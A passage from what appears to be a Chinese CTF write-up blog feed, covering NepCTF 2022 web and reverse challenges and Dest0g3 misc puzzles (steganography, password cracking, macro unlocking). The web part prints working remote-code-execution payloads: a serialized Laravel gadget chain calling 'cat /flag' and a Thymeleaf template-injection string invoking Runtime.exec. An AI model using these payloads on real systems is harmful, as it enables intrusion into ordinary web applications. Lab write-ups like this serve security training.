class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload：</p><p><code>/hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9</code></p><p>​    </p><h3 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h3><blockquote><p>顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭</p><p>（flag在根目录下: /flag）</p></blockquote><p>用jd-gui反编译 <code>challenger.jar</code> 文件，发现使用了Thymeleaf模板，</p><p>在 <code>HelloController.class</code> 里发现 <code>/eval</code> 路由：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  Logger log = LoggerFactory.getLogger(com.veracode.research.HelloController.class);</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;challenger&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/eval&quot;&#125;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考 <a href="https://www.cnblogs.com/hetianlab/p/13679645.html">Thymeleaf 模板注入导致命令执行</a>，修改payload拿到flag：</p><p>Payload:</p><p><code>/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="快来签到"><a href="#快来签到" class="headerlink" title="快来签到"></a>快来签到</h3><blockquote><p>x86 linux</p></blockquote><p>趣味题。</p><p>IDA打开发现报错 <code>The graph is too big more than 1000 nodes...</code>，且 <code>main()</code> 函数中定义多个图节点，到 IDA - Options - Graph - Max number of nodes 里改一个大数保存，回到 <code>main()</code> 函数切换成Graph overview或者IDA View中缩小，可以看到控制流图（CFG）：</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717213910100.png" alt="image-20220717213910100"></p><p>flag：<code>NepCTF&#123;welc0me_t0_nepctf&#125;</code></p><p>​    </p><h3 id="We-can-gone"><a href="#We-can-gone" class="headerlink" title="We_can_gone"></a>We_can_gone</h3><blockquote><p>是出发的时候了!!!</p></blockquote><p>Go逆向，IDA7.7分析，在String窗口里找到关键字符串交叉引用定位入口函数 <code>sub_4994E0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int128 <span class="title">sub_4994E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+1Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4993B0(); <span class="comment">// 输出字符串&quot;Welcome to NepCTF,I gone on the other side&quot;</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  sub_433950();</span><br><span class="line">  runtime_printstring(<span class="string">&quot;please input flag to help you get to the other side:\n&quot;</span>, <span class="number">53</span>);</span><br><span class="line">  sub_4339C0();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xB</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">84</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xC</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xD</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xE</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">69</span>;      <span class="comment">// 定义字符串TRUE</span></span><br><span class="line">  *(_QWORD *)&amp;result = __PAIR64__(v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6);   <span class="comment">// 伪代码混乱</span></span><br><span class="line">  DWORD2(result) = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后半部分伪代码不清晰，在该函数附近发现判断逻辑函数 <code>sub_499630()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_499630</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> *v2; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [esp+Ch] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v6[<span class="number">8</span>]; <span class="comment">// [esp+20h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">2</span>]; <span class="comment">// [esp+44h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">2</span>]; <span class="comment">// [esp+54h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v11[<span class="number">2</span>]; <span class="comment">// [esp+5Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">int</span> *)unknown_libname_8((<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *v2 = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;unk_4A00A0;</span><br><span class="line">  v11[<span class="number">1</span>] = (<span class="keyword">int</span>)v2;</span><br><span class="line">  fmt_Fscanln((<span class="keyword">int</span>)&amp;off_4D25B8, dword_54B200, (<span class="keyword">int</span>)v11, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v4 = (_BYTE *)sub_4479B0((<span class="keyword">int</span>)v6, *v7, v7[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">23</span>                      <span class="comment">//输入字符串长度满足23</span></span><br><span class="line">    &amp;&amp; *v4 == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">4</span>] == <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">5</span>] == <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">6</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">22</span>] == <span class="string">&#x27;&#125;&#x27;</span> )               <span class="comment">//输入字符串满足前缀NepCTF&#123;，后缀满足&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_54B6E4 )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">7</span>) &gt;= <span class="number">0x17</span> )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v4[i + <span class="number">7</span>] != *(_BYTE *)(dword_54B6E0 + i) )     <span class="comment">//将输入和dword_54B6E0比较</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">        v9[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;off_4D2334;</span><br><span class="line">        unknown_libname_61((<span class="keyword">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="keyword">int</span>)v9, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;off_4D233C;</span><br><span class="line">    unknown_libname_61((<span class="keyword">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="keyword">int</span>)v8, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;off_4D2334;</span><br><span class="line">    unknown_libname_61((<span class="keyword">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="keyword">int</span>)v10, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i)</code> 比较处下断点动调，查看 <code>dword_54B6E0</code> 存放的值为 <code>U9eT_t0_th3TRUE</code>，故flag为<code>NepCTF&#123;U9eT_t0_th3TRUE&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>菜。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;“NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。&lt;/p&gt;
&lt;p&gt;比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。&lt;/p&gt;
&lt;p&gt;比赛形式：个人解题</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-05-26T12:09:18.000Z</published>
    <updated>2022-05-28T14:17:41.878Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。</p><p>比赛时间：2022.5.20 10:00 - 5.27 10:00</p><p>题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain</p><p>题目难度：萌新</p><p>比赛类型：个人赛</p><p>比赛交流QQ群：923945203</p><p>个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个</p><p>Rank: 12</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Welcome-to-fxxking"><a href="#Welcome-to-fxxking" class="headerlink" title="Welcome to fxxking"></a>Welcome to fxxking</h3><blockquote><p>关注公众号并回复：Give me the fxxking flag</p></blockquote><p>公众号 <code>Dest0g3 Team</code> 回复：Give me the fxxking flag，</p><p>得到 <code>The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125;</code></p><p>​    </p><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>foremost分解png图片得到zip压缩包，zsteg查看png图片的lsb通道得到 <code>Password for zip:Weak_Pas5w0rd</code>；</p><p>用密码 <code>Weak_Pas5w0rd</code> 解压zip压缩包得到flag：<code>Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;</code>。</p><p>​    </p><h3 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h3><blockquote><p>Enjoy Decoding</p></blockquote><p>用ARCHPR爆破zip压缩包密码得到 <code>100861</code>，按照 摩斯密码-16进制-Unicode-Base64 解码得到 <code>Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code>。</p><p>​    </p><h3 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h3><p>打开flag文件发现是word文件/压缩包，在 <code>document.xml</code> 中找到Base64编码的字符串，解码得到brainfuck，<a href="https://www.splitbrain.org/services/ook">在线解密</a>得到16进制字符串 <code>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code>，转为字符得 <code>Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code>。</p><p>​    </p><h3 id="StrangeTraffic"><a href="#StrangeTraffic" class="headerlink" title="StrangeTraffic"></a>StrangeTraffic</h3><p>Wireshark打开发现是Modbus流量，在流0发现分段Base64字符串 <code>RGVzdDBnM3</code>、<code>szMUE1QkVB</code>、<code>Ni1GMjBELU</code>、<code>YxOEEtRThF</code>、<code>QS0yOUI0Rj</code>、<code>I1NzEwOEJ9</code>，连接解码得 <code>Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code>。</p><p>​    </p><h3 id="EasyWord"><a href="#EasyWord" class="headerlink" title="EasyWord"></a>EasyWord</h3><blockquote><p>Let the word tell u</p></blockquote><p>根据 <code>hint.txt</code> 得知 <code>password.docm</code> 密码全小写字母，且满足 <code>??q?b?</code>，用john爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office2john password.docm &gt; hash.txt</span><br><span class="line">john --mask=<span class="string">&#x27;?l?lq?lb?l&#x27;</span> hash.txt</span><br></pre></td></tr></table></figure><p>得到密码 <code>ulqsbt</code>；</p><p>打开发现存在宏，查看宏代码有密码，参考<a href="https://blog.csdn.net/qq_44768749/article/details/102673212">类似题目</a>中破解宏密码的方法，将word文件用压缩包方式打开，找到 <code>vbaProject.bin</code> 文件以16进制方式查看，将 <code>DBP</code> 改为 <code>DBX</code> 并保存，再将修改后的文件替换到压缩包里，改回word文件格式，重新打开可看到宏代码。</p><p>进入VBA编辑器查看Dialog对应宏代码：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> CB_OK_Click()</span><br><span class="line"><span class="keyword">Dim</span> strpasw <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strdec <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strusrinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">t = ChrW(<span class="number">21152</span>) &amp; ChrW(<span class="number">27833</span>) &amp; ChrW(<span class="number">21543</span>) &amp; ChrW(<span class="number">65292</span>) &amp; ChrW(<span class="number">21516</span>) &amp; ChrW(<span class="number">23398</span>) &amp; ChrW(<span class="number">20204</span>) &amp; ChrW(<span class="number">65281</span>)</span><br><span class="line"></span><br><span class="line">strusrinput = Dialog.TextBox_Pasw</span><br><span class="line"><span class="keyword">Dim</span> sinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">sinput = strusrinput</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (strusrinput &lt;&gt; <span class="string">&quot;&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">  strusout = Encode(strusrinput, t)</span><br><span class="line">  <span class="keyword">If</span> (strusout = <span class="string">&quot;┤℡ǒqｘ~&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">      strdec = Decode(Dialog.Label_ls.Caption, sinput)</span><br><span class="line">  <span class="keyword">Else</span></span><br><span class="line">     <span class="keyword">If</span> (strusout = <span class="string">&quot;ｋGJEｇｑ&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">        strdec = Decode(Dialog.Label_ls1.Caption, sinput)</span><br><span class="line">     <span class="keyword">Else</span></span><br><span class="line">          <span class="keyword">If</span> (strusout = <span class="string">&quot;ЮΟopz+&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">             strdec = Decode(Dialog.Label_ls2.Caption, sinput)</span><br><span class="line">          <span class="keyword">Else</span></span><br><span class="line">                <span class="keyword">If</span> (strusout = <span class="string">&quot;ｚΚjrШφεあ&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)</span><br><span class="line">                <span class="keyword">Else</span></span><br><span class="line">                    <span class="keyword">If</span> (strusout = <span class="string">&quot;àǖtＵｗ┧ｈè&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)</span><br><span class="line">                    <span class="keyword">Else</span></span><br><span class="line">                          strdec = StrConv(t, vbFromUnicode)</span><br><span class="line">                    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">                <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">           <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   Label_CLUE.Caption = strdec</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>无需分析加解密算法，输出结果 <code>strusout</code> 由 <code>Encode(strusrinput, t)</code> 加密得到，只需分别用解密函数反推五个if分支条件对应的明文即可，修改 <code>Label_CLUE.Caption = strdec</code> 为 <code>Label_CLUE.Caption = Decode(xxx,t)</code>，回到word运行 <code>AutoOpen</code> 宏，随便输入字符点击确定即可在Dialog的label处显示对应明文，分别是 <code>123456</code>、<code>aaaaaa</code>、<code>000000</code>、<code>墙角数枝</code>、<code>iloveyou</code>；</p><p>将 <code>Label_CLUE.Caption = Decode(xxx,t)</code> 改回 <code>Label_CLUE.Caption = strdec</code>，分别输入五段明文，发现输入 <code>墙角数枝</code> 得到 <code>解压密码：两只黄鹂鸣翠柳,一行白鹭上青天!</code>，结合word里的hint <code>Rar密码为复杂型，长度为16位，包含了字母、数字和符号。</code>，压缩包密码猜出为 <code>2zhlmcl,1hblsqt.</code>，解压拿到flag：<code>Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</code>。</p><p>​    </p><h3 id="4096"><a href="#4096" class="headerlink" title="4096"></a>4096</h3><blockquote><p>Just relax and always be aware of the changes on the web!</p></blockquote><p>4096小游戏，查看js，用chrome源代码里的搜索功能，搜 <code>flag</code> 可在 <code>local_storage_manager.js</code> 里找到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPartFlag</span>(<span class="params">score</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (score &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次base64解码得到flag后半部分 <code>4ee7-b673-971d81f8b177&#125;</code>。</p><p>前半部分在js内找很久都没找到，观察资源文件里存在 <code>favicon.ico</code> 和 <code>favicon.png</code> 两张图，取出来发现png图有隐写，foremost分出一个wav文件和一个zip文件；</p><p>用audacity查看wav，前后两段是DTMF按键音，解码出 <code>74958097831</code>，中间一段是SSTV慢扫描电视，用robot36扫出图片，内容是 <code>MD5&#123;cell phone number&#125;</code>，将前面的 <code>74958097831</code> 倒序成手机号格式，MD5加密得到 <code>32fc1b5487cb447f792a19418b92544e</code>，解压zip压缩包；</p><p>压缩包里为切割后打乱拼接的图片，利用gaps工具拼图</p><p><code>gaps --image=puzzle.png --size=64 --save</code></p><p>得到的结果还是有部分块位置不对，再gaps两次得到完整原图：</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/part_flag_solution_solution_solution.jpg" alt="part_flag_solution_solution_solution" style="zoom:50%;"></p><p>将字符串拼接得 <code>RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==</code>，base64解码得flag前半段：<code>Dest0g3&#123;ed4d114f-9ee4-</code>。</p><p>​    </p><h3 id="Python-jail"><a href="#Python-jail" class="headerlink" title="Python_jail"></a>Python_jail</h3><blockquote><p>听说python是最好的语言，那我把它锁起来，我就是最好的语言了！</p></blockquote><p>根据hint提示，password里内容是whitespace语言，<a href="https://ideone.com/NUNNbI">在线编译</a>得到 <code>a8e15220-7404-4269-812e-6418557b7dc2</code>，是zip压缩包密码；</p><p>解压zip压缩包，zsteg发现lsb隐写pyc文件，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc</code></p><p>无需反编译，16进制查看发现 <code>ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9</code>，base64解码得 <code>flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</code>。</p><p>​    </p><h3 id="codegame"><a href="#codegame" class="headerlink" title="codegame"></a>codegame</h3><blockquote><p>Funny and ez codegame with Key to celebrate EDG</p></blockquote><p>KEYcode里经查是LOLCODE Language，用dcode解得到输出是 <code>QEFPFPQEBMXPPTLOA</code>，以此为密码解压zip压缩包，得到word文件；</p><p>直接打开word发现 <code>AES</code> 提示，用压缩包打开word有个 <code>fllllllllll1ag.txt</code> 文件，里面是一串emoji表情，猜想为emoji-aes加密，<a href="https://aghorler.github.io/emoji-aes/">在线解密</a>，同样用 <code>QEFPFPQEBMXPPTLOA</code> 作为key，没成功，再不断盲调Rotation，在Rotation为4的时候解密成功，得到</p><p><code>666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D</code></p><p>16进制转字符串得 <code>flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;</code>。</p><p>​    </p><h3 id="rookie-hacker-2"><a href="#rookie-hacker-2" class="headerlink" title="rookie hacker-2"></a>rookie hacker-2</h3><blockquote><p>（容器1的容器名为 <code>test_docker1</code>，容器2的容器名为 <code>test_docker2</code>）</p><p>Alice访问自己的docker时忘记了把容器分别部署在哪些ip上，你能帮帮他么？ Flag格式：Dest0g3{ip1_ip2_…..} 例：假设容器1、容器2的ip为1.1.1.1、2.2.2.2，则flag为 Dest0g3{1.1.1.1_2.2.2.2}</p></blockquote><p>非预期，docker的IP地址会以 <code>&quot;IPAddress&quot;: &quot;172.x.x.x&quot;</code> 的形式记录在配置文件中，直接在E01文件里用正则表达式 <code>&quot;IPAddress&quot;:&quot;172</code> 搜索，取出现频率最高的两个IP即可，flag：<code>Dest0g3&#123;172.18.0.2_172.18.0.3&#125;</code>。</p><p>​    </p><h2 